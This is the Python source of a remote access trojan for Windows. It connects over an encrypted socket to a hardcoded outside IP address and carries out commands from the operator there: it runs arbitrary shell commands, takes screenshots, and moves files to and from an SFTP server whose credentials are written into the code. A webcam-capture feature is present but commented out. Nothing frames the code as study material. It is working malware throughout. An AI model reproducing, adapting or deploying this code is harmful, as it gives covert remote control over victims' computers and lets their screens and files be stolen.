import base64
import re
import win32api
import subprocess
import os
import time
import socket
import platform
import pysftp
import logging
import sys
#import cv2
import shlex


import base64
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from datetime import datetime

root = logging.getLogger()
root.setLevel(logging.DEBUG)

handler = logging.StreamHandler(sys.stdout)
handler.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
root.addHandler(handler)

TMP =  os.getenv('TMP')
ftp = None


class Client:

    def __init__(self, host, port, key):
        password_provided = key  # This is input in the form of a string
        password = password_provided.encode("utf-8")  # Convert to type bytes
        salt = b'salt_'  # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        passkey = base64.urlsafe_b64encode(kdf.derive(password))  # Can only use kdf once
        self.enc = Fernet(passkey)

        # set up the socket and connect to the server
        self.sock = socket.socket()
        self.sock.connect((host, port))
        # get the welcome message
        while True:
            msg = self.sock.recv(1024).decode()
            if msg == "welcome":
                logging.debug("Received welcome, sending thx to sync")
                self.sock.send("thx".encode())
                break

            time.sleep(1)

        #logging.debug("Socket opened, Recived first message: %s",msg)

    def send(self,msg):
        return self.sock.send(self.encrypt(msg))

    def receive(self,):
        return self.decrypt(self.sock.recv(1024)).decode()
        
    def encrypt(self,plain_message):
        logging.debug("Encrypting string %s",plain_message)
        try:
            e = plain_message.encode("utf-8")
        except AttributeError:
            e = plain_message
        return self.enc.encrypt(e)

    def decrypt(self,enc_message):
        try:
            return self.enc.decrypt(enc_message)
        except cryptography.fernet.InvalidToken:
            return enc_message


class Ftp:
    connection=None

    def __init__(self,host,port,username,password):
        self.hostname = platform.uname()[1]
        if self.connection == None:
            cnopts = pysftp.CnOpts()
            cnopts.hostkeys = None
            self.connection = pysftp.Connection(host,port=port, username=username, password=password,cnopts=cnopts)
     

    def download_file(self,remote_file,local_file=None):
        self.connection.get(remote_file,local_file)


    def upload_file(self,filename, remotepath=None, replace_slash=True):

        self.connection.makedirs(self.hostname,mode=755)
        if remotepath == None:
            newfile=filename        
            if replace_slash == True:
                newfile = re.sub(r'[^A-Za-z0-9.]',"-",filename)
            remotepath = "%s/%s"%(self.hostname,newfile)
            
        self.connection.put(filename,remotepath)
        return True

    def close(self):
        if self.connection != None:
            self.connection.close()
            self.connection=None


#def capture_webcam():
#    try:
#        d = datetime.now().strftime('%Y%m%d-%H%M%S')
#        cam = cv2.VideoCapture(0)

#        image = cam.read()[1]
#        cv2.imwrite('%s\\fullscreen-%s.png'%(TMP,d), image)
        #cv2.imshow("image", image)
#        ftp.upload_file('%s\\fullscreen-%s.png'%(TMP,d))
#        cv2.waitKey(0)
#        cv2.destroyAllWindows()
#        return True
#    except:
#        return False


def take_screenshot():
    try:
        from mss import mss
        with mss() as sct:
            d = datetime.now().strftime('%Y%m%d-%H%M%S')
            connect_ftp()
            sct.shot(output='%s\\fullscreen-%s.png'%(TMP,d))
            ftp.upload_file('%s\\fullscreen-%s.png'%(TMP,d))
    except:
        client.send("Failed...")


def connect_ftp():
    global ftp
    host = "94.198.43.76"
    port = 56604
    ftp = Ftp(host,port,'mikael','xqkiaw')
    return ftp

if __name__ == '__main__':
    x = bytearray(1024*1024*100)
    while True:
        try:
            try:
                client = Client("94.198.43.76",58463,"foobar32")
            except:
                logging.debug("Connect failed, waiting 20sec before retry")
                time.sleep(20)
                continue
            # this loop will run until it receive 'quit'
            while True:
                # receive the command and print it
                
                cmd = client.receive()
                cmd_split = cmd.split()

                lexer = shlex.shlex(cmd)
                lexer.whitespace += ' '
                lexer.whitespace_split = True
                output = list(lexer)

                logging.debug(f'[*] receive {cmd}')

                # check if you want to quit
                if len(cmd) == 0:
                    client.send("")
                elif cmd.lower() == 'quit':
                    break
                elif cmd.lower() == 'help':
                    client.send(""\
                    "quit - exit \n"\
                    "take-screenshot - capture screenshot and send \n"\
                    #"capture-webcam - capture picture from webcam and send \n"\
                    "cd -change working dir \n"\
                    "do - execute cmd command\n"\
                    "download $file [$target] - download file to SFTP\n"\
                    "upload $file - upload file from SFTP\n"\
                    "ftp-stop - stop ftp session\n"\
                    "")
                elif cmd.lower() == 'take-screenshot':
                    take_screenshot()
                    client.send("Screenshot taken")
                elif cmd.lower() == 'capture-webcam':
                    if capture_webcam():
                        client.send("Webcam captured")
                    else:
                        client.send("Failed")
                elif cmd_split[0].lower() == 'download':
                    source=str(output[1]).replace('"','')
                    if ftp==None:
                        ftp = connect_ftp()
                    if len(output) <=1:
                        client.send("Not enough arguments...")
                        continue    
                    elif len(output) >= 3:
                        try:
                            dest=str(output[2]).replace('"','')
                            ftp.download_file(source,dest)
                            client.send("Downloading file,  source: %s    dest: %s" %(source,dest))
                        except Exception as e:
                            client.send("Failed...(%s)"%e)
                        
                    else:
                        try:
                            ftp.download_file(source)
                            client.send("Downloading file,  source: %s " %(source))
                        except Exception as e:
                            client.send("Failed...(%s)"%e)
                    
                elif cmd_split[0].lower() == 'upload':                
                    source=str(output[1]).replace('"','')
                    if ftp==None:
                        ftp = connect_ftp()
                    if len(output) <=1:
                        client.send("Not enough arguments...")
                        continue    
                    elif len(output) >= 3:
                        try:
                            dest=str(output[2]).replace('"','')
                            ftp.upload_file(source,dest)
                            client.send("Uploading file,  source: %s    dest: %s" %(source,dest))
                        except Exception as e:
                            client.send("Failed...(%s)"%e)
                        
                    else:
                        try:
                            ftp.upload_file(source)
                            client.send("Uploading file,  source: %s " %(source))
                        except Exception as e:
                            client.send("Failed...(%s)"%e)
                    
                    
                elif cmd_split[0].lower() == 'cd':
                    try:
                        os.chdir(' '.join(cmd_split[1:]))
                        client.send("Changed folder: %s" % os.getcwd())
                    except:
                        client.send("Unable to change folder, still in: %s" % os.getcwd())
                elif cmd_split[0].lower() == 'do':
                    cmd = ' '.join(cmd_split[1:])
                    # now run the command and get the result.
                    try:
                        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL, shell=True).decode('cp437')
                    except Exception as e:
                        result = str(e)
                    # if the command has no output, send 'ok' so the server knows everything is okay
                    if len(result) == 0:
                        result = 'OK'

                    # send teh result to the server
                    client.send(result)
                    
                else:
                    client.send("Unrecognized command: %s" % cmd)
        except:
            logging.debug("Crash :(")
        
        try:
            client.sock.close()
        except:
            logging.debug("Failed to close")
    
    
    

    